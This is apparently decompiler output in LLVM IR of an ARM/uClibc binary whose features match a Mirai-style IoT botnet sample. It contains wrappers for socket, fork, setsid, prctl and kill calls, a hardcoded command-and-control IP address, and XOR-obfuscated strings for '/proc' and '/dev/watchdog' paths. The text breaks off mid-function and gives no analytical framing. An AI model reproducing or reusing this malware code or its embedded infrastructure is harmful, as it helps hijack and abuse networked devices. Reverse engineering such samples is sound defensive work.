source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%_TYPEDEF_fd_set = type { [1 x i32] }
%timeval = type { i32, i32 }
%dirent = type { i32, i32, i16, i8, [256 x i8] }
%__dirstream = type { i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_1a218.3 = global i32 1
@global_var_1a2b0.4 = global i32* @global_var_1a218.3
@global_var_1a2b8.5 = global i32 0
@global_var_1a2bc.6 = global i32 35648
@global_var_1a2c0.7 = global i32 35648
@global_var_1a2c4.8 = global i32 35648
@global_var_1a2c8.9 = global i32 35648
@global_var_1a2cc.10 = global i32 35648
@global_var_1a2d0.11 = global i32 35648
@global_var_1a2d4.12 = global i32 35648
@global_var_1a2d8.13 = global i32 35648
@global_var_1a2dc.14 = global i32 35648
@global_var_1a2e0.15 = global i32 35648
@global_var_1a2e4.16 = global i32 35648
@global_var_1a2e8.17 = global i32 35648
@global_var_1a2ec.18 = global i32 35648
@global_var_1a2f0.19 = global i32 35648
@global_var_1a2f4.20 = global i32 35648
@global_var_1a2f8.21 = global i32 35648
@global_var_1a2fc.22 = global i32 35648
@global_var_1a300.23 = global i32 35648
@global_var_1a308.25 = global i32 35648
@global_var_1a30c.26 = global i32 35648
@global_var_1a310.27 = global i32 35648
@global_var_1a314.28 = global i32 35648
@global_var_1a318.29 = global i32 35648
@global_var_1a31c.30 = global i32 35648
@global_var_1a320.31 = global i32 35648
@global_var_1a324.32 = global i32 35648
@global_var_1a328.33 = global i32 35648
@global_var_1a32c.34 = global i32 35648
@global_var_1a330.35 = global i32 35648
@global_var_1a334.36 = global i32 35648
@global_var_1a338.37 = global i32 35648
@global_var_1a33c.38 = global i32 35648
@global_var_1a340.39 = global i32 35648
@global_var_1a344.40 = global i32 35648
@global_var_1a348.41 = global i32 35648
@global_var_1a34c.42 = global i32 35648
@global_var_1a350.43 = global i32 35648
@global_var_1a354.44 = global i32 35648
@global_var_1a35c.46 = global i32 35648
@global_var_1a360.47 = global i32 35648
@global_var_1a364.48 = global i32 35648
@global_var_1a368.49 = global i32 35648
@global_var_1a36c.50 = global i32 35648
@global_var_1a370.51 = global i32 35648
@global_var_1a374.52 = global i32 35648
@global_var_1a378.53 = global i32 35648
@global_var_1a37c.54 = global i32 35648
@global_var_1a380.55 = global i32 35648
@global_var_1a210.59 = global i32 0
@global_var_1a38c.60 = global i32* @global_var_1a210.59
@global_var_1a3ac.66 = global i32 0
@global_var_ef4c.72 = constant i32 -382906384
@global_var_1a3c8.77 = global i32 0
@global_var_9010.78 = constant i32 -352321546
@global_var_8d88.79 = constant i32 -493894144
@global_var_b1c8.85 = constant i32 -382906384
@global_var_b68c.87 = constant i32 -382906384
@global_var_96d4.89 = constant i32 -382906384
@global_var_d6a8.91 = constant i32 -382906384
@global_var_cf34.93 = constant i32 -382906384
@global_var_c6b8.95 = constant i32 -382906384
@global_var_aaac.98 = constant i32 -382906384
@global_var_a330.100 = constant i32 -382906384
@global_var_10000.102 = constant i32 56361011
@global_var_1a420.104 = global i32 0
@global_var_12028.116 = constant i32 47
@global_var_1a428.118 = global i32 0
@global_var_1a3cc.120 = global i32 0
@global_var_8500.123 = global i32 35956
@global_var_ee0c.125 = constant i32 -382910448
@global_var_1a39c.127 = global i32 72272
@global_var_1a394.129 = global i32 -1
@global_var_1202c.134 = constant [15 x i8] c"178.62.235.153\00"
@global_var_1a430.137 = local_unnamed_addr global i32 0
@global_var_1a42f.138 = local_unnamed_addr global i32 0
@global_var_1a42e.139 = local_unnamed_addr global i32 0
@global_var_1a3d0.141 = global i32 0
@global_var_1a42d.147 = local_unnamed_addr global i32 0
@global_var_1203c.151 = constant i32 10
@global_var_1a398.154 = global i32 -1
@global_var_8d7c.157 = constant i32 -493894144
@global_var_11a50.158 = constant i32 -382910224
@global_var_12040.160 = constant i32 16777216
@global_var_1a3d8.162 = global i32 0
@global_var_1a3e4.164 = global i32 0
@global_var_1a3dc.166 = global i32 0
@global_var_1a3e0.168 = global i32 0
@global_var_1a41c.182 = global i32 0
@global_var_1a3e8.184 = global i32 0
@global_var_1a414.186 = global i32 0
@global_var_1a444.191 = global i32 0
@global_var_1a43c.195 = global i32 0
@global_var_1a440.197 = global i32 0
@global_var_1a3ec.199 = global i32 0
@global_var_1a3ef.200 = local_unnamed_addr global i32 0
@global_var_1a3ee.201 = local_unnamed_addr global i32 0
@global_var_1a400.203 = global i32 0
@global_var_1a3f1.205 = local_unnamed_addr global i32 0
@global_var_1a3f5.206 = local_unnamed_addr global i32 0
@global_var_1a3f4.207 = local_unnamed_addr global i32 0
@global_var_1a403.208 = local_unnamed_addr global i32 0
@global_var_1a401.209 = local_unnamed_addr global i32 0
@global_var_1a3f0.210 = local_unnamed_addr global i32 0
@global_var_1a402.211 = local_unnamed_addr global i32 0
@global_var_1a40f.213 = local_unnamed_addr global i32 0
@global_var_1a40e.214 = local_unnamed_addr global i32 0
@global_var_120cc.216 = constant [5 x i8] c"&;; \00"
@global_var_120d0.218 = constant i32 536542976
@global_var_12048.220 = constant [5 x i8] c"5:?;\00"
@global_var_12050.222 = constant [9 x i8] c"<!: acam\00"
@global_var_1205c.224 = constant [7 x i8] c" 18:1 \00"
@global_var_12064.226 = constant [8 x i8] c"0125!8 \00"
@global_var_1206c.228 = constant [9 x i8] c"$5''#;&0\00"
@global_var_12078.230 = constant [6 x i8] c"509=:\00"
@global_var_12080.232 = constant [6 x i8] c"\22=.,\22\00"
@global_var_12088.234 = constant [8 x i8] c"'!$$;& \00"
@global_var_12090.236 = constant i32 423502179
@global_var_120a0.238 = constant [6 x i8] c"efg`a\00"
@global_var_120a8.240 = constant [5 x i8] c"!'1&\00"
@global_var_120b0.242 = constant i32 943467547
@global_var_120bc.244 = constant i32 322070023
@global_var_1a3f8.245 = local_unnamed_addr global i32 0
@global_var_1a3f6.247 = local_unnamed_addr global i32 0
@global_var_1a3f7.248 = local_unnamed_addr global i32 0
@global_var_1a410.250 = local_unnamed_addr global i32 0
@global_var_1a411.251 = local_unnamed_addr global i32 0
@global_var_120c8.257 = constant [3 x i8] c"\0D\0A\00"
@global_var_120da.259 = constant i32 2096127
@global_var_120d1.261 = constant i32 2095871
@global_var_1a44c.264 = global i32 0
@global_var_1a3a4.267 = global i32 -555811921
@global_var_120e0.272 = constant [3 x i8] c"Qm\00"
@global_var_1a454.273 = local_unnamed_addr global i32 0
@global_var_1a458.274 = local_unnamed_addr global i32 0
@global_var_1a459.275 = local_unnamed_addr global i32 0
@global_var_120e4.277 = constant i32 59987
@global_var_1a45c.278 = local_unnamed_addr global i32 0
@global_var_1a460.279 = local_unnamed_addr global i32 0
@global_var_1a461.280 = local_unnamed_addr global i32 0
@global_var_121c8.282 = constant i32 808465680
@global_var_1a468.283 = local_unnamed_addr global i32 0
@global_var_1a464.284 = local_unnamed_addr global i32 0
@global_var_1a469.285 = local_unnamed_addr global i32 0
@global_var_120e8.287 = constant [8 x i8] c"{$&;7{T\00"
@global_var_1a4b4.288 = local_unnamed_addr global i32 0
@global_var_1a4b8.289 = local_unnamed_addr global i32 0
@global_var_1a4b9.290 = local_unnamed_addr global i32 0
@global_var_120f0.292 = constant [6 x i8] c"{1,1T\00"
@global_var_1a4bc.293 = local_unnamed_addr global i32 0
@global_var_1a4c0.294 = local_unnamed_addr global i32 0
@global_var_1a4c1.295 = local_unnamed_addr global i32 0
@global_var_120f8.297 = constant [5 x i8] c"{20T\00"
@global_var_1a4c8.298 = local_unnamed_addr global i32 0
@global_var_1a4c4.299 = local_unnamed_addr global i32 0
@global_var_1a4c9.300 = local_unnamed_addr global i32 0
@global_var_12100.302 = constant [7 x i8] c"{95$'T\00"
@global_var_1a4cc.303 = local_unnamed_addr global i32 0
@global_var_1a4d0.304 = local_unnamed_addr global i32 0
@global_var_1a4d1.305 = local_unnamed_addr global i32 0
@global_var_12108.306 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_1a4d4.307 = local_unnamed_addr global i32 0
@global_var_1a4d8.308 = local_unnamed_addr global i32 0
@global_var_1a4d9.309 = local_unnamed_addr global i32 0
@global_var_12118.311 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_1a534.312 = local_unnamed_addr global i32 0
@global_var_1a538.313 = local_unnamed_addr global i32 0
@global_var_1a539.314 = local_unnamed_addr global i32 0
@global_var_12124.316 = constant [8 x i8] c"z5:=91T\00"
@global_var_1a53c.317 = local_unnamed_addr global i32 0
@global_var_1a540.318 = local_unnamed_addr global i32 0
@global_var_1212c.320 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_1a4e0.321 = local_unnamed_addr global i32 0
@global_var_1a4dc.322 = local_unnamed_addr global i32 0
@global_var_1a4e1.323 = local_unnamed_addr global i32 0
@global_var_12140.325 = constant [9 x i8] c"5''#;&0T\00"
@global_var_1a4e4.326 = local_unnamed_addr global i32 0
@global_var_1a4e8.327 = local_unnamed_addr global i32 0
@global_var_1a4e9.328 = local_unnamed_addr global i32 0
@global_var_121e8.330 = constant i32 557516544
@global_var_1a4f0.331 = local_unnamed_addr global i32 0
@global_var_1a4ec.332 = local_unnamed_addr global i32 0
@global_var_1a4f1.333 = local_unnamed_addr global i32 0
@global_var_1214c.335 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_1a4f8.336 = local_unnamed_addr global i32 0
@global_var_1a4f4.337 = local_unnamed_addr global i32 0
@global_var_1a4f9.338 = local_unnamed_addr global i32 0
@global_var_12160.340 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_1a500.341 = local_unnamed_addr global i32 0
@global_var_1a4fc.342 = local_unnamed_addr global i32 0
@global_var_1a501.343 = local_unnamed_addr global i32 0
@global_var_12170.345 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_1a504.346 = local_unnamed_addr global i32 0
@global_var_1a508.347 = local_unnamed_addr global i32 0
@global_var_1a509.348 = local_unnamed_addr global i32 0
@global_var_12180.350 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_1a510.351 = local_unnamed_addr global i32 0
@global_var_1a50c.352 = local_unnamed_addr global i32 0
@global_var_1a511.353 = local_unnamed_addr global i32 0
@global_var_12194.355 = constant [9 x i8] c"$662*7!E\00"
@global_var_1a514.356 = local_unnamed_addr global i32 0
@global_var_1a518.357 = local_unnamed_addr global i32 0
@global_var_1a519.358 = local_unnamed_addr global i32 0
@global_var_121a0.360 = constant [6 x i8] c";3=:T\00"
@global_var_1a51c.361 = local_unnamed_addr global i32 0
@global_var_1a520.362 = local_unnamed_addr global i32 0
@global_var_1a521.363 = local_unnamed_addr global i32 0
@global_var_121a8.365 = constant [7 x i8] c"1: 1&T\00"
@global_var_1a524.366 = local_unnamed_addr global i32 0
@global_var_1a528.367 = local_unnamed_addr global i32 0
@global_var_1a529.368 = local_unnamed_addr global i32 0
@global_var_121b0.370 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_1a531.371 = local_unnamed_addr global i32 0
@global_var_1a52c.372 = local_unnamed_addr global i32 0
@global_var_1a530.373 = local_unnamed_addr global i32 0
@global_var_1a208.375 = global i32 0
@global_var_1a204.376 = global i32 -1
@global_var_1a3a8.57 = external global i8*
@global_var_1a3c4.75 = external global i8*
@global_var_1a3c5.83 = global i8 0
@global_var_1a424.122 = external global i8*
@1 = internal constant [2 x i8] c"\01\00"
@global_var_1a3a0.131 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_1a42c.136 = global %sockaddr* null
@global_var_ec84.143 = constant void (i32)* inttoptr (i32 -442556408 to void (i32)*)
@global_var_1a3d4.156 = external global i8*
@global_var_1a418.188 = external global i8*
@global_var_1a419.189 = local_unnamed_addr global i8 0
@global_var_1a40c.204 = local_unnamed_addr global i8 0
@global_var_1a40d.212 = local_unnamed_addr global i8 0
@global_var_1a404.249 = local_unnamed_addr global i8 0
@global_var_1a3fc.246 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8b28() local_unnamed_addr {
entry:
  %v3_8b2c = load i32, i32* @r4, align 4
  %v0_8b34 = call i32 @function_8e2c()
  store i32 %v0_8b34, i32* @r0, align 4
  %v1_8b38 = call i32 @function_11fd8(i32 %v0_8b34)
  call void @__pseudo_branch(i32 %v3_8b2c)
  ret i32 %v1_8b38
}

define i32 @function_8b40(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8b4c = load i32, i32* @global_var_1a2b8.5, align 4
  call void @__pseudo_branch(i32 %v3_8b4c)
  %v0_8b50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8b50, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i8* @_strcpy(i8* %dest, i8* %src) local_unnamed_addr {
entry:
  %v8_8b5c = call i8* @strcpy(i8* %dest, i8* %src)
  ret i8* %v8_8b5c
}

define i32 @_ioctl(i32 %fd, i32 %request, ...) local_unnamed_addr {
entry:
  %v6_8b68 = call i32 (i32, i32, ...) @ioctl(i32 %fd, i32 %request)
  ret i32 %v6_8b68
}

define i32 @_recv(i32 %fd, i32* %buf, i32 %n, i32 %flags) local_unnamed_addr {
entry:
  %v9_8b74 = call i32 @recv(i32 %fd, i32* %buf, i32 %n, i32 %flags)
  ret i32 %v9_8b74
}

define i32 @_connect(i32 %fd, %sockaddr* %addr, i32 %len) local_unnamed_addr {
entry:
  %v8_8b80 = call i32 @connect(i32 %fd, %sockaddr* %addr, i32 %len)
  ret i32 %v8_8b80
}

define i32 @_sigemptyset(%_TYPEDEF_sigset_t* %set) local_unnamed_addr {
entry:
  %v6_8b8c = call i32 @sigemptyset(%_TYPEDEF_sigset_t* %set)
  ret i32 %v6_8b8c
}

define i32* @_memmove(i32* %dest, i32* %src, i32 %n) local_unnamed_addr {
entry:
  %v9_8b98 = call i32* @memmove(i32* %dest, i32* %src, i32 %n)
  ret i32* %v9_8b98
}

define i32 @_getpid() local_unnamed_addr {
entry:
  %v4_8ba4 = call i32 @getpid()
  ret i32 %v4_8ba4
}

define i32 @_prctl(i32 %option, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v9_8bb0 = call i32 @prctl(i32 %option, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  ret i32 %v9_8bb0
}

define i32* @_memcpy(i32* %dest, i32* %src, i32 %n) local_unnamed_addr {
entry:
  %v9_8bbc = call i32* @memcpy(i32* %dest, i32* %src, i32 %n)
  ret i32* %v9_8bbc
}

define i32 @_readlink(i8* %path, i8* %buf, i32 %len) local_unnamed_addr {
entry:
  %v9_8bc8 = call i32 @readlink(i8* %path, i8* %buf, i32 %len)
  ret i32 %v9_8bc8
}

define i32* @_malloc(i32 %size) local_unnamed_addr {
entry:
  %v5_8bd4 = call i32* @malloc(i32 %size)
  ret i32* %v5_8bd4
}

define i32 @_sleep(i32 %seconds) local_unnamed_addr {
entry:
  %v5_8be0 = call i32 @sleep(i32 %seconds)
  ret i32 %v5_8be0
}

define i32 @_recvfrom(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32* %addr_len) local_unnamed_addr {
entry:
  %v10_8bec = call i32 @recvfrom(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32* %addr_len)
  ret i32 %v10_8bec
}

define i32 @_socket(i32 %domain, i32 %type, i32 %protocol) local_unnamed_addr {
entry:
  %v7_8bf8 = call i32 @socket(i32 %domain, i32 %type, i32 %protocol)
  ret i32 %v7_8bf8
}

define i32 @_select(i32 %nfds, %_TYPEDEF_fd_set* %readfds, %_TYPEDEF_fd_set* %writefds, %_TYPEDEF_fd_set* %exceptfds, %timeval* %timeout) local_unnamed_addr {
entry:
  %v12_8c04 = call i32 @select(i32 %nfds, %_TYPEDEF_fd_set* %readfds, %_TYPEDEF_fd_set* %writefds, %_TYPEDEF_fd_set* %exceptfds, %timeval* %timeout)
  ret i32 %v12_8c04
}

define %dirent* @_readdir(%__dirstream* %dirp) local_unnamed_addr {
entry:
  %v6_8c10 = call %dirent* @readdir(%__dirstream* %dirp)
  ret %dirent* %v6_8c10
}

define i32 @_sigaddset(%_TYPEDEF_sigset_t* %set, i32 %signo) local_unnamed_addr {
entry:
  %v7_8c1c = call i32 @sigaddset(%_TYPEDEF_sigset_t* %set, i32 %signo)
  ret i32 %v7_8c1c
}

define i32 @_send(i32 %fd, i32* %buf, i32 %n, i32 %flags) local_unnamed_addr {
entry:
  %v9_8c28 = call i32 @send(i32 %fd, i32* %buf, i32 %n, i32 %flags)
  ret i32 %v9_8c28
}

; Function Attrs: noreturn
define void @_abort() local_unnamed_addr #0 {
entry:
  call void @abort()
  unreachable
}

define i32* @_calloc(i32 %nmemb, i32 %size) local_unnamed_addr {
entry:
  %v6_8c40 = call i32* @calloc(i32 %nmemb, i32 %size)
  ret i32* %v6_8c40
}

define i32 @_write(i32 %fd, i32* %buf, i32 %n) local_unnamed_addr {
entry:
  %v8_8c4c = call i32 @write(i32 %fd, i32* %buf, i32 %n)
  ret i32 %v8_8c4c
}

define i32 @_kill(i32 %pid, i32 %sig) local_unnamed_addr {
entry:
  %v6_8c58 = call i32 @kill(i32 %pid, i32 %sig)
  ret i32 %v6_8c58
}

define i32 @_bind(i32 %fd, %sockaddr* %addr, i32 %len) local_unnamed_addr {
entry:
  %v8_8c64 = call i32 @bind(i32 %fd, %sockaddr* %addr, i32 %len)
  ret i32 %v8_8c64
}

define i32 @_inet_addr(i8* %cp) local_unnamed_addr {
entry:
  %v6_8c70 = call i32 @inet_addr(i8* %cp)
  ret i32 %v6_8c70
}

define i32 @_setsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32 %optlen) local_unnamed_addr {
entry:
  %v10_8c7c = call i32 @setsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32 %optlen)
  ret i32 %v10_8c7c
}

define void (i32)* @_signal(i32 %sig, void (i32)* %handler) local_unnamed_addr {
entry:
  %v7_8c88 = call void (i32)* @signal(i32 %sig, void (i32)* %handler)
  ret void (i32)* %v7_8c88
}

define i32 @_read(i32 %fd, i32* %buf, i32 %nbytes) local_unnamed_addr {
entry:
  %v8_8c94 = call i32 @read(i32 %fd, i32* %buf, i32 %nbytes)
  ret i32 %v8_8c94
}

define i32 @_unlink(i8* %name) local_unnamed_addr {
entry:
  %v6_8ca0 = call i32 @unlink(i8* %name)
  ret i32 %v6_8ca0
}

define i32 @_sendto(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32 %addr_len) local_unnamed_addr {
entry:
  %v11_8cac = call i32 @sendto(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32 %addr_len)
  ret i32 %v11_8cac
}

define i32* @_realloc(i32* %ptr, i32 %size) local_unnamed_addr {
entry:
  %v7_8cb8 = call i32* @realloc(i32* %ptr, i32 %size)
  ret i32* %v7_8cb8
}

define i32 @_listen(i32 %fd, i32 %n) local_unnamed_addr {
entry:
  %v6_8cc4 = call i32 @listen(i32 %fd, i32 %n)
  ret i32 %v6_8cc4
}

define i32 @_fork() local_unnamed_addr {
entry:
  %v4_8cd0 = call i32 @fork()
  ret i32 %v4_8cd0
}

define i32 @___uClibc_main(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v4_8cdc = call i32 @__uClibc_main()
  ret i32 %v4_8cdc
}

define i32* @_memset(i32* %s, i32 %c, i32 %n) local_unnamed_addr {
entry:
  %v8_8ce8 = call i32* @memset(i32* %s, i32 %c, i32 %n)
  ret i32* %v8_8ce8
}

define i32 @_getppid() local_unnamed_addr {
entry:
  %v4_8cf4 = call i32 @getppid()
  ret i32 %v4_8cf4
}

define i32 @_time(i32* %timer) local_unnamed_addr {
entry:
  %v6_8d00 = call i32 @time(i32* %timer)
  ret i32 %v6_8d00
}

define %__dirstream* @_opendir(i8* %name) local_unnamed_addr {
entry:
  %v6_8d0c = call %__dirstream* @opendir(i8* %name)
  ret %__dirstream* %v6_8d0c
}

define i32 @_getsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32* %optlen) local_unnamed_addr {
entry:
  %v9_8d18 = call i32 @getsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32* %optlen)
  ret i32 %v9_8d18
}

define i32* @___errno_location() local_unnamed_addr {
entry:
  %v4_8d24 = call i32* @__errno_location()
  ret i32* %v4_8d24
}

; Function Attrs: noreturn
define void @_exit(i32 %status) local_unnamed_addr #0 {
entry:
  call void @exit(i32 %status)
  unreachable
}

define i32 @_atoi(i8* %nptr) local_unnamed_addr {
entry:
  %v6_8d3c = call i32 @atoi(i8* %nptr)
  ret i32 %v6_8d3c
}

define i32 @_open(i8* %file, i32 %oflag, ...) local_unnamed_addr {
entry:
  %v7_8d48 = call i32 (i8*, i32, ...) @open(i8* %file, i32 %oflag)
  ret i32 %v7_8d48
}

define i32 @_clock() local_unnamed_addr {
entry:
  %v4_8d54 = call i32 @clock()
  ret i32 %v4_8d54
}

define i32 @_setsid() local_unnamed_addr {
entry:
  %v4_8d60 = call i32 @setsid()
  ret i32 %v4_8d60
}

define i32 @_closedir(%__dirstream* %dirp) local_unnamed_addr {
entry:
  %v6_8d6c = call i32 @closedir(%__dirstream* %dirp)
  ret i32 %v6_8d6c
}

define i32 @_fcntl(i32 %fd, i32 %cmd, ...) local_unnamed_addr {
entry:
  %v6_8d78 = call i32 (i32, i32, ...) @fcntl(i32 %fd, i32 %cmd)
  ret i32 %v6_8d78
}

define i32 @_close(i32 %fd) local_unnamed_addr {
entry:
  %v5_8d84 = call i32 @close(i32 %fd)
  ret i32 %v5_8d84
}

define void @_free(i32* %ptr) local_unnamed_addr {
entry:
  call void @free(i32* %ptr)
  ret void
}

define i32 @_sigprocmask(i32 %how, %_TYPEDEF_sigset_t* %set, %_TYPEDEF_sigset_t* %oset) local_unnamed_addr {
entry:
  %v9_8d9c = call i32 @sigprocmask(i32 %how, %_TYPEDEF_sigset_t* %set, %_TYPEDEF_sigset_t* %oset)
  ret i32 %v9_8d9c
}

define i32 @_getsockname(i32 %fd, %sockaddr* %addr, i32* %len) local_unnamed_addr {
entry:
  %v9_8da8 = call i32 @getsockname(i32 %fd, %sockaddr* %addr, i32* %len)
  ret i32 %v9_8da8
}

define i32 @function_8dac() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_8dac = load i32, i32* @r4, align 4
  store i32 %v3_8dac, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1a3a8.57 to i32), i32* %r5.global-to-local, align 4
  %v2_8db4 = load i8, i8* bitcast (i8** @global_var_1a3a8.57 to i8*), align 4
  %v2_8db8 = icmp eq i8 %v2_8db4, 0
  br i1 %v2_8db8, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_8dbc = load i32, i32* @r0, align 4
  ret i32 %v12_8dbc

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1a38c.60 to i32), i32* %r4.global-to-local, align 4
  %v2_8dc4 = load i32, i32* bitcast (i32** @global_var_1a38c.60 to i32*), align 4
  store i32 %v2_8dc4, i32* %r2.global-to-local, align 4
  %v2_8dcc = icmp eq i32 %v2_8dc4, 0
  br i1 %v2_8dcc, label %bb8, label %dec_label_pc_8dd4.preheader

dec_label_pc_8dd4.preheader:                      ; preds = %bb7
  %v1_8dd49 = add i32 %v2_8dc4, 4
  store i32 %v1_8dd49, i32* bitcast (i32** @global_var_1a38c.60 to i32*), align 4
  call void @__pseudo_branch(i32 %v2_8dc4)
  %v2_8de411 = load i32, i32* bitcast (i32** @global_var_1a38c.60 to i32*), align 4
  store i32 %v2_8de411, i32* %r2.global-to-local, align 4
  %v2_8dec12 = icmp eq i32 %v2_8de411, 0
  br i1 %v2_8dec12, label %.loopexit, label %dec_label_pc_8dd4.dec_label_pc_8dd4_crit_edge

dec_label_pc_8dd4.dec_label_pc_8dd4_crit_edge:    ; preds = %dec_label_pc_8dd4.preheader, %dec_label_pc_8dd4.dec_label_pc_8dd4_crit_edge
  %v2_8de413 = phi i32 [ %v2_8de4, %dec_label_pc_8dd4.dec_label_pc_8dd4_crit_edge ], [ %v2_8de411, %dec_label_pc_8dd4.preheader ]
  %v1_8dd8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_8dd4 = add i32 %v2_8de413, 4
  %v2_8dd8 = inttoptr i32 %v1_8dd8.pre to i32*
  store i32 %v1_8dd4, i32* %v2_8dd8, align 4
  %v0_8de0 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_8de0)
  %v2_8de4 = load i32, i32* bitcast (i32** @global_var_1a38c.60 to i32*), align 4
  store i32 %v2_8de4, i32* %r2.global-to-local, align 4
  %v2_8dec = icmp eq i32 %v2_8de4, 0
  br i1 %v2_8dec, label %.loopexit, label %dec_label_pc_8dd4.dec_label_pc_8dd4_crit_edge

.loopexit:                                        ; preds = %dec_label_pc_8dd4.dec_label_pc_8dd4_crit_edge, %dec_label_pc_8dd4.preheader
  %v2_8e0c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8e0c = phi i32 [ %v2_8e0c.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1a3a8.57 to i32), %bb7 ]
  %v3_8e0c = inttoptr i32 %v2_8e0c to i8*
  store i8 1, i8* %v3_8e0c, align 1
  %v2_8e10 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8e10, i32* %r4.global-to-local, align 4
  %v11_8e10 = load i32, i32* @r0, align 4
  ret i32 %v11_8e10

; uselistorder directives
  uselistorder i32 %v2_8de4, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* bitcast (i32** @global_var_1a38c.60 to i32*), { 2, 0, 1, 3 }
  uselistorder i32** @global_var_1a38c.60, { 1, 0 }
  uselistorder i8** @global_var_1a3a8.57, { 1, 0 }
  uselistorder label %dec_label_pc_8dd4.dec_label_pc_8dd4_crit_edge, { 1, 0 }
}

define i32 @function_8e20(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8e20:
  %v0_8e20 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8e20, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8e20
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8e20, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8e2c() local_unnamed_addr {
.thread:
  %v2_8e4c = load i32, i32* inttoptr (i32 107028 to i32*), align 4
  %v2_8e50 = icmp eq i32 %v2_8e4c, 0
  br i1 %v2_8e50, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 107028

bb2:                                              ; preds = %.thread
  ret i32 107028

; uselistorder directives
  uselistorder i32 107028, { 1, 0, 2 }
}

define i32 @function_8e84() local_unnamed_addr {
dec_label_pc_8e84:
  %v5_8e88 = load i32, i32* @r0, align 4
  ret i32 %v5_8e88
}

; Function Attrs: noreturn
define i32 @__start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8e94 = ptrtoint i32* %stack_var_4 to i32
  %v7_8eb4 = call i32 @___uClibc_main(i32 ptrtoint (i32* @global_var_ef4c.72 to i32), i32 %arg2, i32 %v4_8e94, i32 35624, i32 73748, i32 %arg1, i32 %v4_8e94)
  call void @abort()
  unreachable
}

define i32 @function_8ec8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8ec8:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_8ec8 = urem i32 %arg1, 256
  %v2_8ecc = icmp eq i32 %v1_8ec8, 0
  %v1_8ed4 = urem i32 %arg3, 256
  br i1 %v2_8ecc, label %dec_label_pc_8f18, label %dec_label_pc_8ee0

dec_label_pc_8ee0:                                ; preds = %dec_label_pc_8ec8
  %v0_8ee0 = load i32, i32* %r1.global-to-local, align 4
  %v1_8ee0 = add i32 %v0_8ee0, 4
  %v2_8ee0 = inttoptr i32 %v1_8ee0 to i8*
  %v3_8ee0 = load i8, i8* %v2_8ee0, align 1
  %v4_8ee0 = zext i8 %v3_8ee0 to i32
  %v9_8ee4 = icmp eq i32 %v4_8ee0, %v1_8ed4
  br i1 %v9_8ee4, label %dec_label_pc_8f20, label %dec_label_pc_8f08.preheader

dec_label_pc_8f08.preheader:                      ; preds = %dec_label_pc_8ee0
  br label %dec_label_pc_8f08

dec_label_pc_8ef8:                                ; preds = %dec_label_pc_8f08
